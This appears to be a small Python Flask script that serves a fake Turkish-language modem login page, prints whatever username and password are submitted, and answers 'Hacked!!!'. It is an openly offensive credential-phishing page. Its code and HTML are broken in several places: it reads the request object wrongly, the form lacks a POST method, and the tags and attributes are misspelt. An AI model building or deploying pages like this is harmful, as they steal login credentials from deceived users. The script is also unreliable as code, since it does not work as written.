#*-coding:utf-8*-
from flask import Flask,request
app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username=request["username"]
        password=request["password"]
        print(username,password)
        return "Hacked!!!"
    else:

        html='<form><feildset><legend>Modem Girişi</legend><div>Kullanıcı Adı :</div><div><input type="text" name="username" id="username"/></dive><div>Kullanıcı Şifre:</div>' \
             '<div><input type="password name="password" id="password"/></div><div><input type="submit" name="pbtn" value="Giriş"/></div></fieldset></from>'

        return html
if __name__ == "__main__":
    app.run()